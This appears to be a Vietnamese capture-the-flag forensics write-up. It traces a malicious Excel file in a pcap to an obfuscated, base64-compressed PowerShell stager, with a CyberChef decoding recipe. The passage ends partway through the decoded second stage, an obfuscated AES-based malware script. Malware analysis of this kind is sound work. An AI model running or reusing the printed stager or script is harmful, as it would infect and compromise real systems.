Đề cho một file pcap `NoStarWhere.pcapng`, sử dụng tool wireshark để phân tích. Export HTTP thì thấy có một file excel khá đáng nghi. 

![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-07-10%20233056.png)

Tiến hành lưu về và ném lên [VirusTotal](https://www.virustotal.com/gui/home/upload) để phân tích xem có chứa malware không


![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-07-10%20233524.png)

Sau khi phân tích xong thì thấy báo file chứa malware. Vào tab `BEHAVIOR` để xem thì thấy đã truy cập vào một đường dẫn khá đáng nghi
![image](https://github.com/HuyThang25/WriteUp-CTF/assets/93728466/09254bb4-1033-41aa-a841-8e4fb762b08a)


Nhấn vào đường link thì dẫn tới trang web chứa một đoạn powershell
![](https://github.com/HuyThang25/Image/blob/main/Screenshot%202023-07-10%20234202.png)

```
 . ((VaRIablE '*MdR*').NAmE[3,11,2]-JOIn'') (nEW-OBJeCT IO.cOmPrEsSion.DeflAteSTREam( [sYStEm.IO.MeMOrYSTreAM][CoNVeRt]::frOMBase64sTriNG('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' ) , [iO.COmpreSSIOn.cOMPrEssionmode]::decOMpReSS )|% {nEW-OBJeCT  Io.StREamreadEr($_,[TEXt.enCoDInG]::AsciI )} ).reAdToENd()
1
```
Nén lên CyberChef và tiến hành giải mã [Cyberchef](https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Raw_Inflate(0,0,'Adaptive',false,false)Find_/_Replace(%7B'option':'Regex','string':'%60'%7D,'',true,false,true,false)&input=clZwN2I5cmFzLzIvbjhLeW9qcFJDZzNrMGFSVnBjdkRwQkFlaVRHdlJKWEdHQ2RBd0JEYlFCd3UzLzNPekxiQk5yVDMvTTY5NTZnbzJIanZlYXkxWm1iRDBmcmFBZjI4azl0STBrL3B5ZlB2cmQvSDhqcXpXVjl2MWhlYjlkVm1mYmxaMzJ6VzJjMzZmTE0rMjZ5L2JlUlVTVklHeWhmOEhMN1A0UHRuU1hIOXB2SkYwZFdwY3ZKRkxIQkdOeFJWcStIMUlWNVZHb2xIckVMTEtlTk5yeWVlRVhja3VqWEV5NzEwWVJTNWdSYUllMm5UOGZIMlBXM1h1TldNT2ExdDRidTBpeS80VHZxUlBsYWFiZndqdHQyM0xONGVYemJ3dW5Rc1NVOTZiODYrM3ZEcUYrd2NPcDA1WTY4eldYSjFuY213MzFrS0EyNlBqdXM5SlhBd3l6NUt3aFV5MlBYdzFacWlIZVF0UmtpWjRyK0ZNMUtFZ1hQOFZ4d3BNVitWTkY0ME5RcUI0dkt0N0dZYlBRbURRQUdha1p1L2hIZGZGUHNGL3pLSzVBZjZLa25TMGJvTDllZmk1dWMyZjJ6YW1tM25aVHdyRm51MksyMDI2bTFhcitsVDRGUkhweFYvMEhLL29McnNaRGFJQ0lSRWI3dmtCY2ZpTXJTUFBSL1ZiOE9sczd2OFVTQTRBR25WTHZBZThhQnhIdWxEQkJwUHJkRkhlbVJFVnpsQkM5S0pCWldtcFl0b1JwMUlqWFFPN0FrbU9wYnBaUTZ2YTJYbDVEU09LZ012OTZ1cXVMNzFRZkcvNGZYdk4xbGFTQ0REbjRjc0NITmNrc0pIQ0llMFdGMzEwZ09iREtpbDJaRnRKRDFlNkFmR3NRV1ZMbWltU0l5NnQ2UmkzOUtUbm9Pdkk4THQ4OEkydmRITWxnb09xRG5kU2tIT2FzTFVzSE53YXhWbmtJZUtCUVh2K0dpOWZJZEhIYWJQejVzdnVNOGw2RkRUT3ZOcXk5K2NTT3RQaUFtSlg0N1d1Y3FpQW0zUWNvOXdjN09SZHYvOTVDaG5kc3lXZzhURjBGa24zSzVTVVZJTHdGT0MrMk55MmhSRSs4WXljUzJBSjVJbnhPTmNzSWc1SnZZZyt0ckd5d0hjRkpqYU0wSzZSMnZUTzR0d05DZEZlSEdNT0FLYWROLzFrSEpSQldIN3pFVVFWWUd4OU41bVREeTNScGpJRVlhMjhXcU5sdzZJY0tYbDJnd0dsaHhHak9HUjNtUC9SRlZpNFZHOEZFUHdSVTNFVGNuMUEyUVMwdVJyeDVOUDVmT09JWjlJcWJZeFdWakk2Ty9mWlJQeXBoellZMVFXWTVFL3R1YytCd01ZbE8xYldSaDBISElsOEp2a1JYRlk0dVNkWm90b1RhenYzN0xqeXlEQVMzSmNLeHQ5MXBHMDNNNUJ0V1hKdVAySEJkck1EUTNJUWFWVm9ZaDhpSWprSjlBQTg3VTUrbEJsdENDVHZRNC9PRjVBWlltV0JoOTh0WHkzREIrV3NEUjdlYldENWVoWk9tYlUxa0RyM0U4V085UnVQeEw3MkZRREJEZCtMSjJzQnBGU2c4QWlQWGl4UXVETThhKzBQS3EzMGVCWFN6N0dOemJrYW1oMnlucVQ5ckRYSkQwaWFYVkdOaVZvWjFDUUNSaERDOFpMelJDcEtDOWx6c0RuYUxrajBBMUdRZnhEUzBtRmVZdWxJZEtQOHAzSEYwekllNzAwd00zUzhqSTNBUTcvQVZLT1dQRkx6bXdIczhCL3hTVWlUdk8wN3RVRmd4M1ZCSmNyMjlCdTNLSFRHRDhkcFFIdWNYa004OWFuelg2NHJZbHI3WHM5YmlIK0hDUGdReG5hNURXdTZrMjFGZHhYYWRYRW9wdGtvdHNvVmw0TlNxVy9wYm5kL1FCU3ROSm1qMkRSQUpPL3FNL2tLZ1hGOHRoYnFDOW5kNGRTSEsxVUhFV096NEhrampHMTdDZTdlUWVXTDdJcmZUNVdxazBsWG1LVU5xWFFHU0dkVDA2VmlaS29NOWIzYnAwU1JqZXBUSE42WWJKUXQrazlDMkVoUElwcGhPR0taRS96NU9UVlJWTkphQy83NFdGWFFiZ1oyY3NHaUVSalRjQVFUaW5NLzNHYWMrZy8xZ2tTUGtIZUlBQzRLbEJpcU5MOE9jMGtVeWliV2c0WUpwODJuN2FWeklJNkZMVGVYR2NjZkdDZGdwSW9XbG9EU3ZlRE45Q2doTThreWxZZWZORFZaclJnSlFWWWtDUFpWVmljR2FaWWYwSUJYRElaWXhHZUxEdWlKejFWTW1GNkVNaVVIbmtCK3ZPMW5JNzBVQ0xvUHZkMnJwSm9WRzhaZzNsT1JSbVZaZ2F2S3VYQ1FjMHB6UWNQR3ZzV0JtbThHTGMxaUpkaVVZY3ZRa3dFQlpPY2lkbWNvbzBNajhYTjlFVFJpdVBHNGxvWkZPV0NFOWNLc3BWcm5SdlVYdVFBY1U0UU04anQwZnF0Q09XM0t0d2FEOUZtNGVlMkRta0JQaElNVldhT2ttelUwUVMyRjVzNjZwTE12UmFDbkhDSXlZeGlhQXNDQjRaTVZqQ0NZVzlhTG9XR2tCRVBBN3o2Vm4weDNnSWp6cmtwalhvWnRZTEpZa3h3bi95RXExNmlHazlMVkMyZjBYZ0s2aXNwQzNVWWl1MXk0VUJSQ2FuVkIxKzNtZ2piTTBKdW44QnB1VWlUS3NMN1JSL0tKei9ZN3FlKzcxbFB2My9qWjU2UlRybjNWdWNCNnVUQlQxRkpGMVEvc0pSdUM4Z3ArZHFCMGEvZWRGUmk3b1JRZ1ZabFYvY1BvYnc0NG5sbkZocmJSbVBWTUlLNHhEdGdiZGtncEwxRzNuQ3RLN2lBSnVnYWZ2SldGdDdOWHRtNTBoaHkwSVZXNTYzT1lJMndkMkFWUVBQaFhoY0M3Y0dVVkZ6RTRLN2l2RDlBNFJuMjJkdnY2YUM2OFc0enFKU3hGbXlacE5OSThKWlJudE9ZdWNxNy9heWM0cnpKUkcwYk94MDkzK3lWaVYzanl0MGZLdVVKZHp0Uk9oTlZydkR1QlJkOHJKMDhycFdDc29uTndoMHpPUDhLWSswZDNzd29neTg5N0xPNUYrbkZwWWtUbkljZTQrTHBMSjNPWFA3ZWRYQlF3Y29DSDF0Ty9ZeE1PQmNoNFpPVkR1bUQ5aFhpOHpSMXRtVDJPREV5TTV1c1ZNNWlaMUFGNG56RUQ5UU0yd2dhSEN0Zy8vdWp6dm1VUkpPd2dqbTJnTDBRZ3JWNmNRcWRucDJQcUJYRHVBS285WWhNZGlnbVhwbXcxVkhZZG1ybW8xV1QxYUJvbWZGbW5jZGlUNUN3c0cxZUdKc0JyWWc2UTY4S3RkNFFKaUdiYWxBdndyVGoyL25BaXJNZ2tHVE81WmIvZXVMUTRabDZYNGVZSHorbm1NeFlBUEpKalNDT09ZYk5jemY1TkFtbElWVDZQaVZkSlczSVhBWGlRRktSbGlkcS9RWDBYN2dLM29sNFF1RnJ4M2dkWk5hMWtwWGVuYy9Fa1lFb0x4Q25PQTNxMVRiZ29FNTFTNGNTMWkzNUZsVFFzY2xCRTEvSXZCd0Zib28yRGlseXVJd09XcmttSHorWlE4UDVmUlpqZTNNSWFyV0tEeFdmS3grUU1XZk1kQitMMnZYNzlISnpFdU40WVFVZjdSNjBLd2tpUkNueGVXOVVZdkRXclVSU1Zxa0dqZVpqTWN2THU0T0dxSlRqOWN0Z3JhM3VVK2JvSUlqcXZlblNST2ZNVEM3VWJ0TXpIQzhjQVczVytUZ2F4YXh1N1U0bnR0SkVwU0hOa3hTZjZCZ3Y5bXczSUtMZmoyMGYybU5NY2FrOHNXd0RwdUdFR0ZPRFltbjhtQUVNWXZnZ2RPQmoyVnZTZ3c1WXhiSm1tYUM3T3VUc29xRU5WQTE3QmswV3oyS1NGbGI0b0xsNnhFclF3MGluWlkyZVU4SFV3UVU5Vng4WURoUm5MZjIrcFl0dXpkTndpb2pzK0xnRW54OXNOVlVYaG1wMUFsWVhSYjJGUWlWSHJTMUJydXFxMnkxaDliSDBnWjgwdEJkb1RkVzYxNVQzbmZRYjEvQU9DSTdnd2ZrZjBaRFV2ZTBCdzBxSkM5eFlLQnhLR0dZbUpRNFhyampyb1ZSdWorT2U5L0JWSEJGSi9mQWtic3ZtWGVtOEQrWmYxeHNSWWs0SU1vcEF5RXV5SEpuVThDbXVnRWdJZ0h1TUNRWWZjbzQrcWtPcGtjeDlFSmtnM1lpVEtHdm1FYzVMa1JhUCtuNkdxeGRzUm54SGpXRzZTLy9OVElvY0RLSU14V1dxdnFBT3gwdnh5ZU1pYW12a3dXRGdVTjlIQ2Y1NUpRb0tLM0RIR0FrcmVMU0EyVTV2d3M3OGwvMWVoNVlEblZDSjV4UVF6d0JHNDZDQkhmUWM0Wmhzb2VQS3hqMmhQdU5pbFl5NnhxMnVHSXR4c3NPSy9LcnVPc1A2dFBNNnh1NDZCL21vQVUwUHI5UmhrSE1HRm1nT01tbm5lVGhKSy9aQTdCcVBIVjNVc0dDaExhb29QMHZxNHlQZDZDc1VvRDQySHdaVjJ2QllhZWVxMkpLVWk1SnlLaC9saDNiWGJqa1lEckNQN0dubnJ0TEk5Vzl1NVBEaE96RHRpdmtBeFFrTlJzaTB4NlZmY0RZTWt5MGJkaTJBa3NrbWE3ZWtwT25zK3V4Ynd2RHNHWjFzMGJubEYrVTZ4aUxsaHU1a2JraTJVQlJnVmRLZDhtYTdvZEE0T3ZZOFA4Y0o2Sk1ZeldqR0M0ektob1gwYW5mc1Q1UWpXN3JsdlY0ZkZUeVp4SEdObHA5bWd4UEN4RjBLK2Rmek83cTV3RDl2Y3dUOTA5clAvU21pS3RROTRsdXNhZytMZVA4YkwzUkZjVWdFbEQ4ZE8xQy9hOUloVVpjdzlwV2UwdUpGNFRVZXhzbTBRbEswV3prZ1RGZWxCcElpVDhHek40TDA1NStJOWlzWVovWE9rS0l0eTNqRnh4WWE1WGJGeCttSWh4dkk5cjV0dUlPTjlLVHhZVTIwYzk2dkdlbFBuZXcwcHRRODNTcmJZWWtwUWJxTkdsUzY3UlkveHB3OGVVNTdGcUZrZXZoU0V3bU5kWXBEbGhuNm51UlVVcjRyK0NwLy9YcFVlbXozQ3BxOHUzYWtJMmkwMFZmSGVwRnBvOWMyUE9TNy9ZWEdTLzZYNkFWaVFTRktrNWtuWk1ZUnJ0YlNWN0lVZm02WGdqbDU0dm5CNTU3cmJQNWpSUTVPRlRDR25YRVdPSVJrL09kdFF4QUpsMFFEY1Z6YU9XWTAyRnQ5elhwYmlFNzRsZmF5bHpORzBZbVVhcmtXTnZ3ajg5NXdYQndQOElJendwd01LRjVRcEhpbDhyT0J6NXh2dzF2K3ZkOUNxcVpxbGplY0RXTHRlWU9CZE04cVpjNHdDN3BhMXluMitySlhBd3Q2amliMEtYWndOUFRJeXY4ZytPNWk0cmxmajh4T0phdXZocHlKRVZTZS9hYWFEU1FrTHF6VVROTW0vM0FEejNCZlk4dmpOQ3dkLy9nUjcvVnFrRHU3Nk5iZ3BTZFNzdFAyc09ObVpObHhMcjJoS1VFYURra0dqWjhwemhmMWZobzNZdDVmY2xUR3pyblVZNy9EZkNpM3FrNk1NQnNVZjZ2dXlmR2p4MVI5NXBIOUxmRTFUT1QwN1h3cnJaTzQwV1dYanU0V2s4Z2NzTFY0T3VjekMrSytMNzdRRkdVNlBDVVFZWnJlK3B1VGt3UG5uRWZyYVNTT1B5TW45M3ZsMGRrT1NvcFAzNFRRdEFiZFIzRU9Sd2t4Y0Iyb3ZmUTIwZFZ6WnhCYzViSTROZkE5ZEdzdmZtelFVRWJraFR1ZkJOYkQ3RFV5VTlCQ3BTcmtib01wQ3cybUJnL1hmRHI3L2FlejI5SUVjaStieUxGNnFQTlVLREg3UlNVYWtOZ0NZc2RPUGdQTlRtOEdZeXV5ci9EbEtmTTc4V2xxT3ZIZVpYTVRObHMxY3JYTG44Nm0wK0p4WVRXZDBZZzVMTDZLTUh6Vno3alE4V2RRc1RieEkrTURQZGJRbW9odThLL09CQ0VNVEVzV2N2UEFvZDEwd0czb3U2V2NIRmpKeDE3bnVsdTdGT3IrMVpUa3YrK05CTFlNYzBqZUdSdHBaTk1TTTJ6U2EzRHA0Z2lIYjN1em9HZVhUdmxrYjBPQ2dQOXZEdXgrWjlZcjJQeHc1eE9ETEkrbjlLV2NOWmt3UGhtWFBvMkt0Y3RESzcwVzdIRUJ1NkRkUXJHMm5LbWwycVk0TmhESEV4L2lTd042Mk1UK0M4eTN3ZVRnMHN1M2ZoZnlRRkpOcFNuT3BZbVg3RTBjbmhBWE5HeFNCYnJEL3F6d1VKekkrMnZ2WGZnc3pwM093djRvNkZLNHpKQ1l4VGQ2Vy9CT1h1TEFveHpVcE9TSktJbGdjRHJ6SnhIMDJ1RFhRUFZCNCtvU0xWWVBmYXpPaDRxVkZKeURLUGVOWmdKaWNZL3Btd0hCaTA0LzAxeEJEeHBKWG9RNG5xMkNIelJFK3lzcDBGUCs1N2hENng5UjVUbEdsZTJKN3U0THZ0aEJFVzdzdU9FdlB0N3BaVWd2azBuNk1IdUlQSXoxZjgyZUhzd0kweUY1R3RmL2xEdGIwQXJJZjQ1and3M3NacXd6eU1sVzZQNkJQVGhFQVBLbmVJQ0g4WFhGYWJzVExSM0w3cVA0Wm8wSVhhakQySHdySGlUU1hmdXRqOUtRM3lQUzNpNDhHR05yd3ZPejh1OTR0RDMvdk56OVZFWEI0U3N4bkhhd254TzBDSTl5b3lka0pCdlk3RzE3dmRSZk9naHY2ZGZVSG1pd3g1MDM3R3poWUtmSHUyeDd2WDlFbmxVZk11NnExNGdXbFlob0Vqa3NhNzVYRWtVS3dsbmlhV1I3dndQOFRnRkxYYlQ4Um5DQnZJZThJSDZRc1MxZG5PUXhtMHR5TlBFQzNUdVFwcy9idnU0aWNwZ3J4Y0xPRXpwRkd2UENyVjBpWVZIUnc1VDhOUjl0NkUwdDM4R01SQk55dDZSSkkvLy9wV1djam80UHM3RzZYK090K0x4SHY0dHlMTnZZRjY2REtPYURza3JXQTU1VlJDdUNvdm5Yak9udEhxRFRvRG03OFNEeXl4SFJ2LzhmNW9QOUhVZmpFdlJjMkI4WWFEK3g0YjhlRi82WDhCQTgrOURsSVVxUzlvcHpXSnVqUHl4aWtEcC94dWp1SnlBWHNkOVd4SEFZMXVYWkszOHRJdENxRVNLMzZHUkYrU00wT1V1cXIrMUJrMGJDdzByeEw0UUM4dFIrOWhwN1FySHJIa2JlUWFHdzNrZmVIL1lRZjhXL1dwakhLUnBva1BnYXFCNStuYi81SHc9PQ)

Tiếp tục nhận được một đoạn powershell
```powershell
${8rT3WA}  = [tyPe]("{1}{8}{4}{6}{5}{9}{2}{3}{0}{7}"-F 'd',("{0}{1}"-f 'syS','TEm'),("{1}{0}"-f'ERM','h'),'O',("{0}{1}"-f 'eCUrI','tY'),("{0}{1}" -f 'h','Y.Ci'),("{0}{1}{2}" -f '.cry','P','TOGRap'),'e','.s','p') ;.('SV') ("{0}{1}"-f '72','j5O')  (  [TYpe]("{9}{1}{4}{0}{8}{10}{6}{12}{7}{11}{3}{2}{5}" -F 'TY',("{1}{2}{0}" -f 'eC','Yst','em.s'),'Od','m','uri','e','p','Di',("{0}{1}" -f'.','cRY'),'s',("{2}{1}{0}"-f 'Y.','toGRapH','p'),'ng','aD')  ) ;   ${XNfD}=[tyPe]("{2}{0}{1}{3}"-f 'te',("{0}{1}"-f'm','.cONV'),'Sys','ErT')  ;  ${HLvW1} =  [tYPe]("{2}{4}{3}{5}{1}{0}" -f 'iNG',("{0}{2}{1}" -f 't','Od','.EnC'),'S',("{1}{2}{0}"-f '.t','S','tEM'),'Y','EX');  .("{0}{2}{1}" -f'SeT','m',("{0}{1}"-f'-iT','e')) (("{0}{1}"-f 'vA','RI')+("{0}{1}" -f 'a','bLE')+("{1}{0}" -f'y7',':92'))  (  [Type]("{1}{2}{0}" -F ("{1}{0}{2}"-f 'NEt.dn','eM.','S'),'Sys','t'))  ; ${UJXRc}=[tyPE]("{1}{2}{0}" -F 'nG','Str','i') ;function CrEATe-AeSmanAGeDoBJeCt(${vxZTmff}, ${5TMRWpLUy}) {
    
    ${AJuJVRAZ99}           = .("{1}{2}{3}{0}"-f 't',("{0}{1}" -f'Ne','w-'),("{1}{0}" -f 'e','Obj'),'c') ("{7}{9}{8}{0}{10}{2}{6}{5}{3}{11}{1}{4}"-f 'ty','nag',("{0}{2}{1}" -f 'Cry','o','pt'),'y','ed','ph','gra',("{0}{1}"-f'Sy','stem.'),("{0}{1}"-f 'ecur','i'),'S','.',("{0}{2}{1}" -f'.','sMa','Ae'))
    ${AJUjvrAZ99}."Mode"      =   (  .("{1}{2}{0}" -f 'lE',("{1}{0}" -f't-vA','gE'),("{1}{0}" -f'Ab','RI'))  ("8rt"+"3Wa") -Value  )::"cBc"
    ${aJujVRAZ99}."PAddInG"   =  ( .("{0}{1}"-f 'Di','r')  ("{2}{3}{0}{1}"-f'le:72j5','o','v','ARIab')  )."VALUe"::"zeRos"
    ${AJUJvrAz99}."BlOckSizE" = 128
    ${AjuJvRAz99}."keysIze"   = 256
    
    if (${5TMRWPluy}) {
        
        if (${5TmRWpLuy}.("{0}{1}{2}" -f ("{1}{0}"-f 'tT','ge'),'y','pe')."iNVOke"()."nAME" -eq ("{0}{2}{1}" -f 'St','g','rin')) {
            ${ajUjvRaZ99}."Iv" =  (&("{1}{0}"-f'r','di')  ("{0}{1}{2}{3}" -f 'va','RI','aB','le:xNFd'))."vAlUe"::("{1}{2}{3}{0}"-f 'ing','Fro',("{1}{0}{2}" -f'se','mBa','64'),'Str')."InVOKe"(${5TMRWPlUy})
        }
        
        else {
            ${ajUjVraZ99}."IV" = ${5tmRwPLUy}
        }
    }
    
    if (${VxZtMFF}) {
